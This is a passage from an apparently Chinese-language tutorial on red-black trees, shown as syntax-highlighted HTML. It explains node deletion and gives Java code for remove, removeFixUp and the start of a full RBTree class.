punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Case 3条件：叔叔是黑色，且当前节点是右孩子。</span>            <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">leftRotate</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 将根节点设为黑色</span>    <span class="token function">setBlack</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>insertFixUp(node)的作用是对应”上面所讲的第三步”。它是一个内部接口。</p><h3 id="5-删除操作"><a href="#5-删除操作" class="headerlink" title="5.删除操作"></a>5.删除操作</h3><p>将红黑树内的某一个节点删除。需要执行的操作依次是：首先，将红黑树当作一颗二叉查找树，将该节点从二叉查找树中删除；然后，通过”旋转和重新着色”等一系列来修正该树，使之重新成为一棵红黑树。详细描述如下：<br><strong>第一步：将红黑树当作一棵二叉查找树，将结点删除</strong><br>这和”删除常规二叉查找树中删除节点的方法是一样的”。分3种情况：<br>① 被删除节点没有儿子，即为叶节点。那么，直接将该节点删除就OK了。<br>② 被删除节点只有一个儿子。那么，直接删除该节点，并用该节点的唯一子节点顶替它的位置。<br>③ 被删除节点有两个儿子。那么，先找出它的后继节点；然后把“它的后继节点的内容”复制给“该节点的内容”；之后，删除“它的后继节点”。在这里，后继节点相当于替身，在将后继节点的内容复制给”被删除节点”之后，再将后继节点删除。这样就巧妙的将问题转换为”删除后继节点”的情况了，下面就考虑后继节点。 在”被删除节点”有两个非空子节点的情况下，它的后继节点不可能是双子非空。既然”的后继节点”不可能双子都非空，就意味着”该节点的后继节点”要么没有儿子，要么只有一个儿子。若没有儿子，则按”情况① “进行处理；若只有一个儿子，则按”情况② “进行处理。</p><p><strong>第二步：通过“旋转和重新着色”等一系列操作修正该树，使其重新成为一棵红黑树。</strong><br>因为”第一步”中删除节点之后，可能会违背红黑树的特性。所以需要通过”旋转和重新着色”来修正该树，使之重新成为一棵红黑树。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*  * 删除结点(node)，并返回被删除的结点 * * 参数说明： *     node 删除的结点 */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> child<span class="token punctuation">,</span> parent<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> color<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 被删除节点的"左右孩子都不为空"的情况。</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 被删节点的后继节点。(称为"取代节点")</span>        <span class="token comment" spellcheck="true">// 用它来取代"被删节点"的位置，然后再将"被删节点"去掉。</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> replace <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取后继节点</span>        replace <span class="token operator">=</span> replace<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>replace<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            replace <span class="token operator">=</span> replace<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "node节点"不是根节点(只有根节点不存在父节点)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span>                <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span>left <span class="token operator">=</span> replace<span class="token punctuation">;</span>            <span class="token keyword">else</span>                <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span>right <span class="token operator">=</span> replace<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// "node节点"是根节点，更新根节点。</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> replace<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// child是"取代节点"的右孩子，也是需要"调整的节点"。</span>        <span class="token comment" spellcheck="true">// "取代节点"肯定不存在左孩子！因为它是一个后继节点。</span>        child <span class="token operator">=</span> replace<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>replace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 保存"取代节点"的颜色</span>        color <span class="token operator">=</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>replace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "被删除节点"是"它的后继节点的父节点"</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>            parent <span class="token operator">=</span> replace<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// child不为空</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token operator">!=</span>null<span class="token punctuation">)</span>                <span class="token function">setParent</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            parent<span class="token punctuation">.</span>left <span class="token operator">=</span> child<span class="token punctuation">;</span>            replace<span class="token punctuation">.</span>right <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token function">setParent</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">,</span> replace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        replace<span class="token punctuation">.</span>parent <span class="token operator">=</span> node<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        replace<span class="token punctuation">.</span>color <span class="token operator">=</span> node<span class="token punctuation">.</span>color<span class="token punctuation">;</span>        replace<span class="token punctuation">.</span>left <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        node<span class="token punctuation">.</span>left<span class="token punctuation">.</span>parent <span class="token operator">=</span> replace<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>color <span class="token operator">==</span> BLACK<span class="token punctuation">)</span>            <span class="token function">removeFixUp</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        node <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left <span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        child <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        child <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    parent <span class="token operator">=</span> node<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 保存"取代节点"的颜色</span>    color <span class="token operator">=</span> node<span class="token punctuation">.</span>color<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token operator">!=</span>null<span class="token punctuation">)</span>        child<span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// "node节点"不是根节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span>            parent<span class="token punctuation">.</span>left <span class="token operator">=</span> child<span class="token punctuation">;</span>        <span class="token keyword">else</span>            parent<span class="token punctuation">.</span>right <span class="token operator">=</span> child<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> child<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>color <span class="token operator">==</span> BLACK<span class="token punctuation">)</span>        <span class="token function">removeFixUp</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>    node <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * 删除结点(z)，并返回被删除的结点 * * 参数说明： *     tree 红黑树的根结点 *     z 删除的结点 */</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span>        <span class="token function">remove</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>内部接口</strong> – remove(node)的作用是将”node”节点插入到红黑树中。<br><strong>外部接口</strong> – remove(key)删除红黑树中键值为key的节点。</p><p>删除修正操作的实现代码</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/* * 红黑树删除修正函数 * * 在从红黑树中删除插入节点之后(红黑树失去平衡)，再调用该函数； * 目的是将它重新塑造成一颗红黑树。 * * 参数说明： *     node 待修正的节点 */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">removeFixUp</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> other<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>            other <span class="token operator">=</span> parent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Case 1: x的兄弟w是红色的  </span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setRed</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">leftRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                other <span class="token operator">=</span> parent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                <span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Case 2: x的兄弟w是黑色，且w的俩个孩子也都是黑色的  </span>                <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                node <span class="token operator">=</span> parent<span class="token punctuation">;</span>                parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Case 3: x的兄弟w是黑色的，并且w的左孩子是红色，右孩子为黑色。  </span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">rightRotate</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    other <span class="token operator">=</span> parent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Case 4: x的兄弟w是黑色的；并且w的右孩子是红色的，左孩子任意颜色。</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>other<span class="token punctuation">,</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">leftRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                node <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            other <span class="token operator">=</span> parent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Case 1: x的兄弟w是红色的  </span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setRed</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">rightRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                other <span class="token operator">=</span> parent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                <span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Case 2: x的兄弟w是黑色，且w的俩个孩子也都是黑色的  </span>                <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                node <span class="token operator">=</span> parent<span class="token punctuation">;</span>                parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Case 3: x的兄弟w是黑色的，并且w的左孩子是红色，右孩子为黑色。  </span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">leftRotate</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    other <span class="token operator">=</span> parent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Case 4: x的兄弟w是黑色的；并且w的右孩子是红色的，左孩子任意颜色。</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>other<span class="token punctuation">,</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">rightRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                node <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span>        <span class="token function">setBlack</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>removeFixup(node, parent)是对应”上面所讲的第三步”。它是一个内部接口。</p><h2 id="红黑树的完整源码"><a href="#红黑树的完整源码" class="headerlink" title="红黑树的完整源码"></a>红黑树的完整源码</h2><p>下面是红黑树实现的完整代码和相应的测试程序。<br>(1) 除了上面所说的”左旋”、”右旋”、”添加”、”删除”等基本操作之后，还实现了”遍历”、”查找”、”打印”、”最小值”、”最大值”、”创建”、”销毁”等接口。<br>(2) 函数接口大多分为内部接口和外部接口。内部接口是private函数，外部接口则是public函数。<br>(3) 测试代码中提供了”插入”和”删除”动作的检测开关。默认是关闭的，打开方法可以参考”代码中的说明”。建议在打开开关后，在草稿上自己动手绘制一下红黑树。</p><p>红黑树的实现文件(RBTree.java)</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Java 语言: 红黑树 * * @author skywang * @date 2013/11/07 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RBTree</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> mRoot<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 根结点</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> RED   <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> BLACK <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RBTNode</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token punctuation">{</span>        <span class="token keyword">boolean</span> color<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 颜色</span>        T key<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 关键字(键值)</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> left<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 左孩子</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> right<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 右孩子</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 父结点</span>        <span class="token keyword">public</span> <span class="token function">RBTNode</span><span class="token punctuation">(</span>T key<span class="token punctuation">,</span> <span class="token keyword">boolean</span> color<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> left<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>left <span class="token operator">=</span> left<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>right <span class="token operator">=</span> right<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> T <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> key<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token operator">+</span>key<span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>color<span class="token operator">==</span>RED<span class="token operator">?</span><span class="token string">"(R)"</span><span class="token operator">:</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">RBTree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        mRoot<span class="token operator">=</span>null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">parentOf</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> node<span class="token operator">!=</span>null <span class="token operator">?</span> node<span class="token punctuation">.</span>parent <span class="token operator">:</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> node<span class="token operator">!=</span>null <span class="token operator">?</span> node<span class="token punctuation">.</span>color <span class="token operator">:</span> BLACK<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isRed</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>color<span class="token operator">==</span>RED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">isRed</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setBlack</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span>            node<span class="token punctuation">.</span>color <span class="token operator">=</span> BLACK<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setRed</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span>            node<span class="token punctuation">.</span>color <span class="token operator">=</span> RED<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setParent</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span>            node<span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setColor</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">,</span> <span class="token keyword">boolean</span> color<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span>            node<span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 前序遍历"红黑树"     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">preOrder</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tree <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>key<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">preOrder</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">preOrder</span><span class="token punctuation">(</span>tree<span class="token 